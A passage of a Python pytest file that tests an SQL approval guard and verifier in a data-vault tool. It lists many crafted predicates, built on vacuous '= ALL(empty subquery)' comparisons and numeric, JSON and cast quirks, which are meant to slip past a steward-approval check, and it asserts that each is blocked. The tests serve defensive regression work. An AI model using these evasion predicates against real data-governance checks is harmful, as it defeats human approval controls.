        "NULLIF(1, (WITH c AS (SELECT 1 AS x) SELECT x FROM c WHERE x = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (WITH c AS (SELECT 1 AS x) SELECT x FROM c LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (WITH c(v) AS (SELECT 1) SELECT v FROM c WHERE v = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(2, (WITH c AS (SELECT 2 AS x UNION ALL SELECT 1 AS x) SELECT x FROM c LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT col0 FROM (VALUES (1)) AS t LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (WITH RECURSIVE c AS (SELECT 1 AS x UNION ALL SELECT x + 1 FROM c WHERE x < 2) SELECT x FROM c LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        # 4. DOUBLE precision loss (>= 2^53) in NULLIF
        "NULLIF(CAST(9007199254740993 AS DOUBLE), 9007199254740993) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(9007199254740993, CAST(9007199254740993 AS DOUBLE)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(9007199254740992e0, 9007199254740993) = ALL(SELECT 1 WHERE FALSE)",
        # 5. TRY(...) INT32/INT64 overflow & ABS(INT_MIN)
        "TRY(2147483647 + 1) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(9223372036854775807 + 1) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(ABS(-2147483648)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(100000 * 100000 - 10000000000) = ALL(SELECT 1 WHERE FALSE)",
        # 6. TRY_CAST('on'|'off' AS BOOLEAN)
        "CAST(TRY_CAST('on' AS BOOLEAN) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(TRY_CAST('off' AS BOOLEAN) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        # 7. Multi-step JSON_EXTRACT / JSON_EXTRACT_STRING on JSON_OBJECT(...)
        "JSON_EXTRACT(JSON_OBJECT('a', 1), '$.a.b') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT(JSON_OBJECT('a', TRUE), '$.a[0]') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT(JSON_OBJECT('a', '[1,2]'), '$.a[0]') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT_STRING(JSON_OBJECT('a', '{\"x\":1}'), '$.a.x') = ALL(SELECT x FROM staging.empty_t)",
        # 8. Numeric-to-string scalar_to_str divergence inside NULLIF
        "NULLIF(CAST(4 / 2 AS VARCHAR), '2.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(ROUND(1.25::DOUBLE, 0) AS VARCHAR), '1.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(FLOOR(1.5::DOUBLE) AS VARCHAR), '1.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(CEIL(1.5::DOUBLE) AS VARCHAR), '2.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(FLOOR(1.5::DOUBLE) || '', '1.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT(CEIL(1.5::DOUBLE), ''), '2.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CONCAT_WS('', ROUND(1.25::DOUBLE, 0)), '1.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(1.00 AS VARCHAR), '1.00') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(-0.0 AS VARCHAR), '0.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(FLOOR(1) || '', '1.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(ROUND(2, 1) || '', '2') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(FLOOR(1e16) AS VARCHAR), '1e+16') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CAST(ROUND(1.50, 2) AS VARCHAR), '1.50') = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    big309 = "1" + ("0" * 309)
    big400 = "1" + ("0" * 400)
    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        # 1. Mixed oversized int + float arithmetic (no OverflowError + blocked)
        ("duckdb_local", f"NULLIF({big309} + 1.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF({big400} + 1.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF({big400} - 1.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF({big400} * 1.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF({big400} / 2.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", f"NULLIF({big400} % 2.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        ("duckdb_local", "NULLIF(1e308 * 10.0, 1.0) = ALL(SELECT 1 WHERE FALSE)"),
        # 3. Postgres implicit VALUES column1
        (
            "postgres",
            "NULLIF(1, (SELECT column1 FROM (VALUES (1)) AS t LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        ),
        # 6. Snowflake dialect-dependent boolean strings
        ("snowflake", "CAST(TRY_TO_BOOLEAN('on') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "CAST(TRY_TO_BOOLEAN('off') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    star_subq = "NULLIF(1, (SELECT x FROM (SELECT * FROM (SELECT 1 AS x) AS i) AS o LIMIT 1))"
    assert is_bool_or_null_expr(sqlglot.parse_one(star_subq, read="duckdb")) is True

    valid_controls = (
        ("duckdb_local", "NULLIF(s.hk, 'x')", "NULLIF(s.hk, 'x') = ANY(s.arr)"),
        ("duckdb_local", "TRY(1 + 2)", "TRY(1 + 2) = ANY(ARRAY[3])"),
        (
            "duckdb_local",
            "CAST(TRY_CAST('true' AS BOOLEAN) AS VARCHAR)",
            "CAST(TRY_CAST('true' AS BOOLEAN) AS VARCHAR) = ANY(ARRAY['true'])",
        ),
        ("snowflake", None, "CAST(TRY_TO_BOOLEAN('true') AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "CAST('abc' AS VARCHAR)", "CAST('abc' AS VARCHAR) = ANY(ARRAY['abc'])"),
        ("snowflake", None, "CONCAT_WS(',', NULL, 'b') = 'b'"),
        ("duckdb_local", "TRY_CAST(1.5 AS DOUBLE)", "TRY_CAST(1.5 AS DOUBLE) = ANY(ARRAY[1.5])"),
        (
            "duckdb_local",
            "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B')",
            "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B') = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "JSON_EXTRACT(JSON_OBJECT('a', JSON_OBJECT('b', 'ok')), '$.a.b')",
            "JSON_EXTRACT(JSON_OBJECT('a', JSON_OBJECT('b', 'ok')), '$.a.b') = ANY(s.arr)",
        ),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        if ctrl_expr is not None:
            assert ddb.execute(
                f"SELECT {ctrl_expr} FROM staging.s AS s"
            ).fetchone()[0] is not None, ctrl_expr
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter41_r8_cte_aliases_json_prov_decimal_try_and_bool_lit() -> None:
    """Remediate all 5 converged r8 item groups with 0 FPs across controls and 80/80 bundles."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[])"
    )
    ddb.execute("INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'])")
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")
    ddb.execute("CREATE TABLE staging.empty_j (x JSON)")

    live_preds = (
        # 1a. eval_nullif_null CTE/subquery column indirection via asm/bsm
        "NULLIF((WITH c AS (SELECT 4 / 2 AS v) SELECT CAST(v AS VARCHAR) FROM c), '2.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((SELECT CAST(v AS VARCHAR) FROM (SELECT 4 / 2 AS v) AS t), '2.0') = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF((WITH c AS (SELECT 1e20 AS v) SELECT FLOOR(v) + 1 FROM c), 1e20) = ALL(SELECT 1.0 WHERE FALSE)",
        "NULLIF((WITH c AS (SELECT 9007199254740993 AS v) SELECT CAST(v AS DOUBLE) FROM c), 9007199254740993) = ALL(SELECT 1 WHERE FALSE)",
        # 1b. _bound_in_select SELECT output aliases in ORDER BY / GROUP BY / HAVING / QUALIFY
        "NULLIF(1, (SELECT 1 AS x ORDER BY x LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x GROUP BY x)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x HAVING x = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS x QUALIFY ROW_NUMBER() OVER () = 1 AND x = 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (WITH c AS (SELECT 1 AS x) SELECT x AS y FROM c ORDER BY y LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        # 2a. Nested JSON_EXTRACT / JSON_EXTRACT_STRING on JSON_OBJECT(...)
        "JSON_EXTRACT(JSON_EXTRACT(JSON_OBJECT('a', 1), '$.a'), '$.b') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT(JSON_EXTRACT(JSON_OBJECT('a', '{\"x\":1}'), '$.a'), '$.x') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT_STRING(JSON_EXTRACT(JSON_OBJECT('a', '{\"x\":1}'), '$.a'), '$.x') = ALL(SELECT x FROM staging.empty_t)",
        # 2b. Unrecognized Func/Anonymous fail-closed in JSON_EXTRACT & container extraction
        "JSON_EXTRACT_STRING(CONCAT('{\"b\":1}', CASE WHEN s.id = 2 THEN '' ELSE '' END), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT(JSON_EXTRACT(COALESCE(NULLIF(s.hk, 'k1'), '{\"b\":1}'), '$.b'), '$.a') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT(TO_JSON(1), '$.a[0]') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT_STRING(TO_JSON(1), '$.a.x') = ALL(SELECT x FROM staging.empty_t)",
        "CAST(JSON_EXTRACT(TO_JSON(1), '$.a') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(TO_JSON(1)['a'] AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        # 3a/3b/3c/3d. Exact DECIMAL vs float, CAST(float >= 2^53 AS BIGINT), >64-bit int, int_float_lossy
        "NULLIF(0.1 + 0.2, 0.3) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1.1 - 0.9, 0.2) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(9007199254740993 + 1.0, 9007199254740994.0) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CAST(9007199254740993.0 AS BIGINT), 9007199254740993) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1000000000000000000000000000000000000000, 1000000000000000000000000000000000000001) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(CAST(1000000000000000000000000000000000000000 AS VARCHAR), '1e+40') = ALL(SELECT x FROM staging.empty_t)",
        "IF(9007199254740993 IN (9007199254740992e0), NULL, 1) = ALL(SELECT 1 WHERE FALSE)",
        "CASE 9007199254740993 WHEN 9007199254740992e0 THEN NULL ELSE 'ok' END = ALL(SELECT x FROM staging.empty_t)",
        "NULLIF(CASE WHEN 9007199254740993 IN (9007199254740992e0) THEN 1 ELSE 2 END, 1) = ALL(SELECT 1 WHERE FALSE)",
        # 4. TRY(...) narrow & unsigned integer overflow / underflow / ABS(INT_MIN)
        "TRY(CAST(100 AS TINYINT) + CAST(100 AS TINYINT)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(ABS(CAST(-128 AS TINYINT))) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(-CAST(-128 AS TINYINT)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(CAST(30000 AS SMALLINT) + CAST(30000 AS SMALLINT)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(ABS(CAST(-32768 AS SMALLINT))) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(CAST(0 AS UTINYINT) - CAST(1 AS UTINYINT)) = ALL(SELECT 1 WHERE FALSE)",
        "TRY(CAST(0 AS UINTEGER) - CAST(1 AS UINTEGER)) = ALL(SELECT 1 WHERE FALSE)",
        # 5. parse_bool_lit whitespace rejection
        "CAST(TRY_CAST(' 1 ' AS BOOLEAN) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(TRY_CAST(' true ' AS BOOLEAN) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        # 1b across 8/8 dialects
        *(
            (tid, "NULLIF(1, (SELECT 1 AS x ORDER BY x LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)")
            for tid in SQL_TARGET_IDS
        ),
        *(
            (
                tid,
                "NULLIF(1, (WITH c AS (SELECT 1 AS x) SELECT x AS y FROM c ORDER BY y LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
            )
            for tid in SQL_TARGET_IDS
        ),
        # 2b across BigQuery & Postgres
        (
            "bigquery",
            "JSON_VALUE(CONCAT('{\"b\":1}', CASE WHEN s.id = 2 THEN '' ELSE '' END), '$.a') = ALL(SELECT x FROM staging.empty_t)",
        ),
        (
            "postgres",
            "(CAST(CONCAT('{\"b\":1}', CASE WHEN s.id = 2 THEN '' ELSE '' END) AS JSONB)->>'a') = ALL(SELECT x FROM staging.empty_t)",
        ),
        # 3b/3d/3e cross-dialect
        (
            "postgres",
            "NULLIF(CAST(9007199254740993.0 AS BIGINT), 9007199254740993) = ALL(SELECT 1 WHERE FALSE)",
        ),
        (
            "snowflake",
            "DECODE(9007199254740993, 9007199254740992e0, NULL, 'ok') = ALL(SELECT x FROM staging.empty_t)",
        ),
        ("duckdb_local", "NULLIF(CAST(SIGN(1.5) AS VARCHAR), '1.0') = ALL(SELECT x FROM staging.empty_t)"),
        (
            "postgres",
            "NULLIF(CAST(SIGN(1.5::DOUBLE PRECISION) AS VARCHAR), '1.0') = ALL(SELECT x FROM staging.empty_t)",
        ),
        # 5. Snowflake & BigQuery boolean string restrictions
        ("snowflake", "CAST(TRY_TO_BOOLEAN(' 1 ') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
        ("snowflake", "CAST(TRY_TO_BOOLEAN(' true ') AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "CAST(SAFE_CAST('t' AS BOOL) AS STRING) = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "CAST(SAFE_CAST('1' AS BOOL) AS STRING) = ALL(SELECT x FROM staging.empty_t)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 1c. Recursive CTE anchor expansion (SELECT * and VALUES anchors)
    for rec_lhs in (
        "NULLIF(1, (WITH RECURSIVE c AS (SELECT * FROM (SELECT 1 AS x) AS i UNION ALL SELECT x + 1 FROM c WHERE x < 2) SELECT x FROM c LIMIT 1))",
        "NULLIF(2, (WITH RECURSIVE c AS (VALUES (1) UNION ALL SELECT col0 + 1 FROM c WHERE col0 < 2) SELECT col0 FROM c ORDER BY col0 DESC LIMIT 1))",
    ):
        assert is_bool_or_null_expr(sqlglot.parse_one(rec_lhs, read="duckdb")) is True, rec_lhs

    valid_controls = (
        ("duckdb_local", "NULLIF((WITH c AS (SELECT 1 AS x) SELECT x FROM c), 2)", "NULLIF((WITH c AS (SELECT 1 AS x) SELECT x FROM c), 2) = ANY(ARRAY[1])"),
        ("duckdb_local", "TRY(1 + 2)", "TRY(1 + 2) = ANY(ARRAY[3])"),
        ("duckdb_local", "CAST(TRY_CAST('true' AS BOOLEAN) AS VARCHAR)", "CAST(TRY_CAST('true' AS BOOLEAN) AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "CAST(TRY_CAST('false' AS BOOLEAN) AS VARCHAR)", "CAST(TRY_CAST('false' AS BOOLEAN) AS VARCHAR) = ANY(ARRAY['false'])"),
        ("snowflake", None, "CAST(TRY_TO_BOOLEAN('true') AS VARCHAR) = ANY(ARRAY['true'])"),
        ("duckdb_local", "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B')", "JSON_EXTRACT(JSON_EXTRACT('{\"A\": {\"B\": \"ok\"}}', '$.A'), '$.B') = ANY(s.arr)"),
        ("duckdb_local", "NULLIF(0.5 + 0.25, 0.5)", "NULLIF(0.5 + 0.25, 0.5) = ANY(ARRAY[0.75])"),
    )
    for ok_tid, ctrl_expr, ok_pred in valid_controls:
        if ctrl_expr is not None:
            assert ddb.execute(
                f"SELECT {ctrl_expr} FROM staging.s AS s"
            ).fetchone()[0] is not None, ctrl_expr
        dialect = get_dialect_profile(ok_tid).sqlglot_dialect or "duckdb"
        ok_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {ok_pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(ok_sql, read=dialect)) is True, (
            ok_tid, ok_pred
        )
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == [], (
            ok_tid, ok_pred
        )
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
        ) == [], (ok_tid, ok_pred)
    ddb.close()

    w1 = _build_wave1_am_ir()
    w2 = _build_wave2_am_ir(w1)
    for tid in SQL_TARGET_IDS:
        comp = SqlGlotVaultCompiler(tid)
        for cand_ir in (ir, ir_long, ir_unstruct, w1, w2):
            bundle = comp.compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []




def test_iter42_r9_decimal_fmod_json_binary_try_scope_bit_anonagg() -> None:
    """Remediate all 5 converged r9 findings with sound fail-closed semantics and 0 FPs."""
    import duckdb

    from opendv.storage._bool_expr_guard import is_bool_or_null_expr
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    ddb = duckdb.connect(":memory:")
    ddb.execute("CREATE SCHEMA staging")
    ddb.execute(
        "CREATE TABLE staging.s (hk VARCHAR, id INT, steward_gate_status VARCHAR, "
        "b BOOLEAN[], arr VARCHAR[], meta_json VARCHAR)"
    )
    ddb.execute(
        "INSERT INTO staging.s VALUES ('k1', 2, 'APPROVED', [TRUE], ['ok'], '{\"a\":\"ok\"}')"
    )
    ddb.execute("CREATE TABLE staging.empty_t (x VARCHAR)")
    ddb.execute("CREATE TABLE staging.empty_j (x JSON)")

    live_preds = (
        # 1a. Lossy decimal/float literals in IF/CASE/IN
        "IF(1.0000000000000001 = 1.0, 1, NULL) = ALL(SELECT 1 WHERE FALSE)",
        "CASE 1.0000000000000001 WHEN 1.0 THEN 1 ELSE NULL END = ALL(SELECT 1 WHERE FALSE)",
        "IF(1.0000000000000001 IN (1.0), 1, NULL) = ALL(SELECT 1 WHERE FALSE)",
        "CASE 9007199254740993.0 WHEN 9007199254740992.0 THEN 1 ELSE NULL END = ALL(SELECT 1 WHERE FALSE)",
        "IF(9007199254740993.0 = 9007199254740992.0, 1, NULL) = ALL(SELECT 1 WHERE FALSE)",
        "IF(0.10000000000000001 = 0.1, 1, NULL) = ALL(SELECT 1 WHERE FALSE)",
        "CASE 0.10000000000000001 WHEN 0.1 THEN 1 ELSE NULL END = ALL(SELECT 1 WHERE FALSE)",
        "IF(9007199254740993.0 IN (9007199254740992.0), 1, NULL) = ALL(SELECT 1 WHERE FALSE)",
        # 1b. Exact integer modulo for negative ints >= 2^53 (no math.fmod precision loss)
        "NULLIF(-9007199254740993 % 2, -1) = ALL(SELECT 1 WHERE FALSE)",
        # 2. Non-Func expressions (exp.Binary / exp.Unary) inside JSON_EXTRACT / JSON_EXTRACT_STRING
        "JSON_EXTRACT(1 + 2, '$.a') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT_STRING(1 + 2, '$.a') = ALL(SELECT x FROM staging.empty_t)",
        "JSON_EXTRACT(1.5 + 2.5, '$.a') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT(s.id + 1, '$.a') = ALL(SELECT x FROM staging.empty_j)",
        "JSON_EXTRACT('a' = 'b', '$.a') = ALL(SELECT x FROM staging.empty_j)",
        # 3. Multi-hop CTE/subquery narrow/unsigned integer CAST inside TRY(...)
        "(WITH c1 AS (SELECT CAST(100 AS TINYINT) AS x), c2 AS (SELECT x + 1 AS y FROM c1) SELECT TRY(y + 100) FROM c2) = ALL(SELECT 1 WHERE FALSE)",
        "(WITH c1 AS (SELECT CAST(0 AS UTINYINT) AS x), c2 AS (SELECT x + 0 AS y FROM c1) SELECT TRY(y - 1) FROM c2) = ALL(SELECT 1 WHERE FALSE)",
        "(WITH c1 AS (SELECT CAST(-128 AS TINYINT) AS x), c2 AS (SELECT COALESCE(x, 0) AS y FROM c1) SELECT TRY(ABS(y)) FROM c2) = ALL(SELECT 1 WHERE FALSE)",
        "(SELECT TRY(y + 100) FROM (SELECT x + 1 AS y FROM (SELECT CAST(100 AS TINYINT) AS x) AS t1) AS t2) = ALL(SELECT 1 WHERE FALSE)",
        "(WITH a AS (SELECT CAST(100 AS TINYINT) AS y), b AS (SELECT -y AS z FROM a) SELECT TRY(z + z) FROM b) = ALL(SELECT 1 WHERE FALSE)",
        # 4b & 4c. VALUES ORDER BY col0 & SELECT ... AS y WHERE y = 1
        "NULLIF(1, (VALUES (1) ORDER BY col0 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)",
        "NULLIF(1, (SELECT 1 AS y WHERE y = 1)) = ALL(SELECT 1 WHERE FALSE)",
        # 5a. BIT separated from BOOLEAN in TRY_CAST
        "CAST(TRY_CAST('true' AS BIT) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
        "CAST(TRY_CAST('false' AS BIT) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)",
    )
    for pred in live_preds:
        assert ddb.execute(
            f"SELECT COUNT(*) FROM staging.s AS s WHERE {pred}"
        ).fetchone()[0] == 1, pred

    dialect_blocked = (
        *(("duckdb_local", p) for p in live_preds),
        ("snowflake", "DECODE(1.0000000000000001, 1.0, 1, NULL) = ALL(SELECT 1 WHERE FALSE)"),
        ("snowflake", "CAST(TRY_TO_BOOLEAN(1.5) AS VARCHAR) = ALL(SELECT x FROM staging.empty_t)"),
        ("bigquery", "CAST(SAFE_CAST(1.5 AS BOOL) AS STRING) = ALL(SELECT x FROM staging.empty_t)"),
        ("postgres", "NULLIF(1, (VALUES (1) ORDER BY column1 LIMIT 1)) = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "histogram(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        ("clickhouse", "entropy(NULL) OVER () = ALL(SELECT 1 WHERE FALSE)"),
        *(
            (tid, "JSON_EXTRACT(1 + 2, '$.a') = ALL(SELECT x FROM staging.empty_j)")
            for tid in SQL_TARGET_IDS
        ),
        *(
            (tid, "NULLIF(-9007199254740993 % 2, -1) = ALL(SELECT 1 WHERE FALSE)")
            for tid in SQL_TARGET_IDS
        ),
        ("duckdb_local", "(1 + 2)[1] = ALL(SELECT 1 WHERE FALSE)"),
    )
    for tid, pred in dialect_blocked:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {pred}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(u_sql, read=dialect)) is False, (
            tid, pred
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, tid, extra_unstructured_links=["lnk_u"])
        ), (tid, pred)
        with pytest.raises(OpenDVError) as exc_v:
            gate.verify_sql_ast(tid, u_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
        assert exc_v.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_v.value.exit_code == 50

    # 4a. _smap_bindings is_opq non-FP checks
    for fp_q in (
        "SELECT (SELECT NULLIF(hk, 'x') FROM staging.s AS s2 LIMIT 1) FROM (SELECT 'ok' AS hk) AS outer_t",
        "SELECT 1 FROM (SELECT 'k1' AS hk) AS o WHERE EXISTS (SELECT 1 FROM staging.s WHERE NULLIF(hk, 'x') = ANY(arr))",
    ):
        ast = sqlglot.parse_one(fp_q, read="duckdb")
